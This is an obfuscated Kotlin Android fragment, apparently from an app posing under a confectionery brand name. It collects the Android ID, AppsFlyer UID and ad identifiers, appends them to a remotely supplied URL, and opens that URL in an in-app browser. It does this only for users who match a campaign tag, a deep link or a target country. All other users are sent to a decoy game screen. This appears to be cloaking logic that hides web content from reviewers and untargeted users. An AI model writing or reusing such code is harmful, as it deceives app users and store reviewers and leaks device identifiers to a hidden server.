package com.ferrero.app.fragments

import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.os.Build
import android.os.Bundle
import androidx.fragment.app.Fragment
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import com.appsflyer.AppsFlyerLib
import com.ferrero.app.cont.GaamerGamerActivity2
import com.ferrero.app.R
import com.ferrero.app.brovvv.BrovserGoogleActivity
import com.ferrero.app.mainclas.GoodClass
import com.ferrero.app.mainclas.GoodClass.Companion.pppppppppapapap
import com.ferrero.app.mainclas.GoodClass.Companion.aps_iddddddaaa
import com.my.tracker.MyTracker
import org.koin.android.ext.android.inject
import org.koin.core.qualifier.named

class FillllyFragment : Fragment() {
    override fun onAttach(context: Context) {
        super.onAttach(context)
        gtgtgtgtgthyyhhyhy = context
    }


    val subFourggtgt = "sub_id_4="
    val subFiverrrrrrr = "sub_id_5="
    val onefrfrrfrf = "deviceID="
    val subSixxxxxx = "sub_id_6="
    val nammgtgtgtgt = "naming"
    val trololohyhyhy = "deeporg"
    val subOnefrrfrf = "sub_id_1="
    val ad_idfrfrfrf = "ad_id="


    private lateinit var gtgtgtgtgthyyhhyhy: Context
    val ggtgokkgttgk: SharedPreferences by inject(named("SharedPreferences"))



    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View? {
        return inflater.inflate(R.layout.fragment_filllly, container, false)
    }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)

        val counthhyyhhyhy = ggtgokkgttgk.getString("country", null)
        val appCampgtgtgtgt = ggtgokkgttgk.getString("appCamp", null)
        val deepStgttgtgt = ggtgokkgttgk.getString("deepSt", null)
        val countryDevgtgtgtgt = ggtgokkgttgk.getString("countryDev", null)
        val appsgtgtgtgt = ggtgokkgttgk.getString("apps", null)
        val wvgtgtgtgtgt = ggtgokkgttgk.getString("wv", null)
        val mainIdfrfrrfrf = ggtgokkgttgk.getString("mainId", null)
        val packtgtgtgtgt = pppppppppapapap
        val buildVerssssssss = Build.VERSION.RELEASE
        val myTrIdffrrfrf = ggtgokkgttgk.getString(GoodClass.instIdfrfrf, null)
        val trackerParamsfrffrrf = MyTracker.getTrackerParams()
        trackerParamsfrffrrf.setCustomUserId(myTrIdffrrfrf)


        val ffrfrfrfrrf = Intent(activity, BrovserGoogleActivity::class.java)
        val gtgtgtgttg = Intent(activity, GaamerGamerActivity2::class.java)


        val afIdssssss = AppsFlyerLib.getInstance().getAppsFlyerUID(gtgtgtgtgthyyhhyhy)
        AppsFlyerLib.getInstance().setCollectAndroidID(true)

        ggtgokkgttgk.edit().putString(aps_iddddddaaa, afIdssssss).apply()

        //?????????? ???????? ??????????????
        val linkAppsfrrffr = "$wvgtgtgtgtgt$subOnefrrfrf$appCampgtgtgtgt&$onefrfrrfrf$afIdssssss&$ad_idfrfrfrf$mainIdfrfrrfrf&$subFourggtgt$packtgtgtgtgt&$subFiverrrrrrr$buildVerssssssss&$subSixxxxxx$nammgtgtgtgt"
        val linkMTfrrffrgtgt = "$wvgtgtgtgtgt$onefrfrrfrf$myTrIdffrrfrf&$ad_idfrfrfrf$myTrIdffrrfrf&$subFourggtgt$packtgtgtgtgt&$subFiverrrrrrr$buildVerssssssss&$subSixxxxxx$nammgtgtgtgt"
        val linkFBfrrfrf = "$wvgtgtgtgtgt$subOnefrrfrf$deepStgttgtgt&$onefrfrrfrf$afIdssssss&$ad_idfrfrfrf$mainIdfrfrrfrf&$subFourggtgt$packtgtgtgtgt&$subFiverrrrrrr$buildVerssssssss&$subSixxxxxx$trololohyhyhy"
        val linkFBNullAppsfrrffrrffr = "$wvgtgtgtgtgt$subOnefrrfrf$deepStgttgtgt&$onefrfrrfrf$myTrIdffrrfrf&$ad_idfrfrfrf$myTrIdffrrfrf&$subFourggtgt$packtgtgtgtgt&$subFiverrrrrrr$buildVerssssssss&$subSixxxxxx$trololohyhyhy"

        when(appsgtgtgtgt) {
            "1" ->
                if(appCampgtgtgtgt!!.contains("tdb2")) {
                    ggtgokkgttgk.edit().putString("link", linkAppsfrrffr).apply()
                    ggtgokkgttgk.edit().putString("WebInt", "campaign").apply()
                    startActivity(ffrfrfrfrrf)
                    activity?.finish()
                } else if (deepStgttgtgt!=null||countryDevgtgtgtgt!!.contains(counthhyyhhyhy.toString())) {


                    ggtgokkgttgk.edit().putString("link", linkFBfrrfrf).apply()
                    ggtgokkgttgk.edit().putString("WebInt", "deepLink").apply()
                    startActivity(ffrfrfrfrrf)
                    activity?.finish()
                } else {
                    startActivity(gtgtgtgttg)
                    activity?.finish()
                }
            "0" ->
                if(deepStgttgtgt!=null) {
                    ggtgokkgttgk.edit().putString("link", linkFBNullAppsfrrffrrffr).apply()
                    ggtgokkgttgk.edit().putString("WebInt", "deepLinkNOApps").apply()
                    startActivity(ffrfrfrfrrf)
                    activity?.finish()
                } else if (countryDevgtgtgtgt!!.contains(counthhyyhhyhy.toString())) {
                    ggtgokkgttgk.edit().putString("link", linkMTfrrffrgtgt).apply()
                    ggtgokkgttgk.edit().putString("WebInt", "geo").apply()
                    startActivity(ffrfrfrfrrf)
                    activity?.finish()
                } else {
                    startActivity(gtgtgtgttg)
                    activity?.finish()
                }
        }
    }
}
